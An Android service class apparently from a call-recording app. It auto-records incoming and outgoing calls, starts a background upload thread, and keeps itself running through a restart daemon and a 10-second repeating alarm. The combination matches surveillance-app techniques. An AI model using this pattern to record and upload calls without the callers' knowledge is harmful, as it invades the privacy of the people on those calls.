package com.underconverbg.detectophone;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.coolerfall.daemon.Daemon;
import com.underconverbg.detectophone.system.SystemSet;
import com.underconverbg.detectophone.upload.UploadTools;

import java.util.Calendar;

/**
 * Created by user on 2017/3/2.
 */

public class PhoneCallStateService extends Service
{

//    private OutgoingCallState outgoingCallState;
    private OutgoingCallReciver outgoingCallReciver;
    TelListener  telListener;

    @Override
    public void onCreate()
    {
        super.onCreate();
        Daemon.run(this, PhoneCallStateService.class, Daemon.INTERVAL_ONE_MINUTE * 2);

        Log.e("Service", "onCreate...");
        SystemSet.getIntance().init(this.getApplicationContext());
        //开启上传线程
        Log.e("Service", "onStartCommand...");
        UploadTools.createUploadThreadAndStart();
        doInThread();

        again();
    }

    public void doInThread()
    {
        MyRecorder  recorder = new MyRecorder();
        //------以下应放在onStartCommand中，但2.3.5以下版本不会因service重新启动而重新调用--------
        //监听电话状态，如果是打入且接听 或者 打出 则开始自动录音
        //通话结束，保存文件到外部存储器上
        Log.e("Recorder", "正在监听中...");
//        outgoingCallState = new OutgoingCallState(this);
        outgoingCallReciver = new OutgoingCallReciver(recorder);
        telListener = new TelListener(recorder);
//        outgoingCallState.startListen();
//        Toast.makeText(this, "服务已启动", Toast.LENGTH_LONG).show();

        //去电
        IntentFilter outgoingCallFilter = new IntentFilter();
        outgoingCallFilter.addAction(OutgoingCallState.ForeGroundCallState.IDLE);
        outgoingCallFilter.addAction(OutgoingCallState.ForeGroundCallState.DIALING);
        outgoingCallFilter.addAction(OutgoingCallState.ForeGroundCallState.ALERTING);
        outgoingCallFilter.addAction(OutgoingCallState.ForeGroundCallState.ACTIVE);
        outgoingCallFilter.addAction(OutgoingCallState.ForeGroundCallState.DISCONNECTED);

        outgoingCallFilter.addAction("android.intent.action.PHONE_STATE");
        outgoingCallFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");

        //注册接收者
        registerReceiver(outgoingCallReciver, outgoingCallFilter);

        //来电
        TelephonyManager telmgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        telmgr.listen(telListener, PhoneStateListener.LISTEN_CALL_STATE);
    }


    @Override
    public IBinder onBind(Intent intent)
    {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
        unregisterReceiver(outgoingCallReciver);
        Toast.makeText(this, "已关闭电话监听服务", Toast.LENGTH_LONG)
                .show();
        Log.e("Recorder", "已关闭电话监听服务");
    }

    private void again()
    {
        Intent intent = new Intent(this,
                Receiver1.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.setAction("Action.Alarm1");


        PendingIntent sender = PendingIntent.getBroadcast(
                this, 0, intent, 0);

        // We want the alarm to go off 10 seconds from now.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(Calendar.SECOND, 10);
        // Schedule the alarm!

        //定时器
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis(), 10 * 1000, sender);
    }
}
